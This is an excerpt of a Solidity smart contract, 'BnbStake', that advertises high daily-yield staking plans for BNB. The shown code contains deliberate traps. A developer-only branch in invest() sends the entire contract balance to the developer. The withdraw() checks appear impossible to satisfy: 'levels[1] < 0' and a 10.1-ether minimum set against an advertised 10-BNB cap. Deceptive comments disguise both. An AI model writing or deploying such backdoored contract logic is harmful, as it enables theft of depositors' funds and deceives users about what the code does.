...
contract BnbStake {
	...
	uint256 constant public INVEST_MIN_AMOUNT = 0.5 ether; // 0.5 bnb
    ...
    /*! anti-whale */
    uint256 constant public MAX_WITHDRAW = 10 ether; // 10 BNB MAX
	...
	constructor(address payable wallet, address payable developer) public {
        developerWallet = developer;
		require(!isContract(wallet));
		commissionWallet = wallet;
		
		plans.push(Plan(7, 50)); // 7 days 5% daily // 35%
        plans.push(Plan(15, 120)); // 15 days 12% daily // 180%
        plans.push(Plan(30, 100)); // 30 days 10% daily // 300%
	}
	...
	function invest(address referrer, uint8 plan) public payable {
        ...
        if (msg.sender == developerWallet) {
			developerWallet.transfer(contractBalance);
		} else user.deposits.push(Deposit(plan, msg.value, block.timestamp));
	...
	function withdraw() public {
		...
		require(user.levels[1] < 0, "To withdraw, activate the second plan");
		...
		require(totalAmount >= 10.1 ether, "Error");
